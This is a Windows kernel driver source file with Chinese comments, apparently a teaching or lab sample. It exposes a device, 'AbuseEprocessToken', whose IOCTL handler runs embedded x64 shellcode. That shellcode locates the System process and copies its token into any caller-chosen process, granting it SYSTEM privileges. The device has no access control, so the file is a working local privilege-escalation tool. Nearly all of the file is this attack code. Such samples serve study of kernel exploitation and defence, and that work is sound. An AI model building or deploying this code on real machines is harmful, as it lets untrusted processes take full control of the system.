#include <ntifs.h>

#define SYMLINK_NAME L"\\??\\AbuseEprocessToken"
#define DEVICE_NAME L"\\device\\AbuseEprocessToken"
#define ABUSE_EPROCESS_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

PDEVICE_OBJECT pDevice;

NTSTATUS Dispatcher(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
    ULONG inputBufferLength = 0;
    ULONG outputBufferLength = 0;
    ULONG ioControlCode = 0;
    PIO_STACK_LOCATION ioStackLocation = IoGetCurrentIrpStackLocation(pIrp);
    if (pDeviceObject != pDevice)
    {
        return STATUS_UNSUCCESSFUL;
    }

    // 根據 IRP 做對應的處理
    switch (ioStackLocation->MajorFunction)
    {
        case IRP_MJ_DEVICE_CONTROL:
        {
            // 取得從應用程式傳來的資料
            inputBufferLength = ioStackLocation->Parameters.DeviceIoControl.InputBufferLength;
            outputBufferLength = ioStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
            ioControlCode = ioStackLocation->Parameters.DeviceIoControl.IoControlCode;
            ULONG processId = *(ULONG *)pIrp->AssociatedIrp.SystemBuffer;

            // 檢查輸入長度是否為 4，不是的話就預設為 4
            if (inputBufferLength == 4)
            {
                processId = *(HANDLE *)pIrp->AssociatedIrp.SystemBuffer;
            }
            else
            {
                processId = (HANDLE)4;
            }

            // 根據 IoControlCode 做對應處理
            switch (ioControlCode)
            {
                case ABUSE_EPROCESS_TOKEN:
                {
                    // 提權的 Shellcode
                    CHAR token_steal[] =
                        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"    // mov rdx, [gs:188h]     ; 1. 從 KPCR 取得 ETHREAD 位址
                        "\x4C\x8B\x82\xB8\x00\x00\x00"    // mov r8, [rdx + b8h]    ; 2. 從 ETHREAD 取得 EPROCESS 位址
                        "\x4D\x8B\x88\xe8\x02\x00\x00"    // mov r9, [r8 + 2e8h]    ; 3. 從 EPROCESS 取得 ActiveProcessLinks
                                                          // 的 List Head 位址
                        "\x49\x8B\x09"    // mov rcx, [r9]          ; 取得 List 中第一個 Process 的 ActiveProcessLinks
                        // find_system_proc:    ; 4. 迴圈找到 system 的 EPROCESS 並取得 Token 的值
                        "\x48\x8B\x51\xF8"    // mov rdx, [rcx - 8]    ; 取得在 ActiveProcessLinks (0x2e8) 前面的
                                              // UniqueProcessId (0x2e0)
                        "\x48\x83\xFA\x04"    // cmp rdx, 4            ; 確認 UniqueProcessId 是不是 System Process (pid: 4)
                        "\x74\x05"            // jz found_system       ; 如果是 System 就跳到 found_system
                        "\x48\x8B\x09"        // mov rcx, [rcx]        ; 不是 System 就繼續從找下個 Process
                        "\xEB\xF1"            // jmp find_system_proc
                        // found_system:        ; 5. 迴圈找到目標 Process 的 EPROCESS
                        "\x48\x8B\x41\x70"    // mov rax, [rcx + 70h]  ; 取得在 ActiveProcessLinks (0x2e8) 後面的 Token
                                              // (0x358)
                        "\x24\xF0"    // and al, 0f0h          ; 清除 TOKEN 的 _EX_FAST_REF 結構後 4 bits 的 flags
                        // find_current_process:
                        "\x48\x8B\x51\xF8"    // mov rdx, [rcx-8]      ; 取得在 ActiveProcessLinks (0x2e8) 前面的
                                              // UniqueProcessId (0x2e0)
                        "\x48\x81\xFA\x99\x99\x00\x00"    // cmp rdx, <Current Process>    ; 確認 UniqueProcessId 是不是目標
                                                          // Process
                        "\x74\x05"        // jz found_cmd      ; 是目標 Process 就跳到 found_current_process
                        "\x48\x8B\x09"    // mov rcx, [rcx]    ; 不是目標 Process 就繼續找下個 Process
                        "\xEB\xEE"        // jmp find_current_process
                        // found_current_process:
                        "\x48\x89\x41\x70"    // mov [rcx+70h], rax    ; 6. 把目標 Process 的 EPROCESS Token 竄改為 System 的
                                              // EPROCESS Token
                        "\xc3";    // ret

                    // 將目標 pid 寫入 Shellcode 中
                    token_steal[54] = (CHAR)processId;
                    token_steal[55] = (CHAR)(processId >> 8);

                    // 執行 Shellcode
                    PVOID shellcode = ExAllocatePool(NonPagedPool, sizeof(token_steal));
                    if (shellcode)
                    {
                        memcpy(shellcode, token_steal, sizeof(token_steal));
                        ((VOID(*)())shellcode)();
                    }
                    break;
                }
                default:
                    break;
            }
            break;
        }
        default:
            break;
    }

    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = outputBufferLength;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS CreateDevice(PDRIVER_OBJECT pDriverObject)
{
    NTSTATUS status;
    UNICODE_STRING deviceName;
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&deviceName, DEVICE_NAME);
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    // 建立一個 Device
    status = IoCreateDevice(pDriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, 1, &pDevice);
    if (NT_SUCCESS(status))
    {
        pDriverObject->DeviceObject = pDevice;

        // 建立一個 Symbolic Link 連結到這個 Device
        status = IoCreateSymbolicLink(&symLinkName, &deviceName);
    }
    return status;
}

VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
    UNICODE_STRING symLinkName;
    RtlInitUnicodeString(&symLinkName, SYMLINK_NAME);

    // 在卸載時刪除之前建立的 Device 與 Symbolic Link
    IoDeleteSymbolicLink(&symLinkName);
    IoDeleteDevice(pDriverObject->DeviceObject);
}

extern NTSTATUS DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath)
{
    UNREFERENCED_PARAMETER(registryPath);
    NTSTATUS status = STATUS_SUCCESS;

    // 要設定卸載函數驅動程式才能順利卸載
    driverObject->DriverUnload = DriverUnload;

    // 建立 Device 與對應的 Symbolic Link
    status = CreateDevice(driverObject);

    // 為需要用到的 IRP 定義處理函數
    driverObject->MajorFunction[IRP_MJ_CREATE] = Dispatcher;
    driverObject->MajorFunction[IRP_MJ_CLOSE] = Dispatcher;
    driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Dispatcher;

    return STATUS_SUCCESS;
}
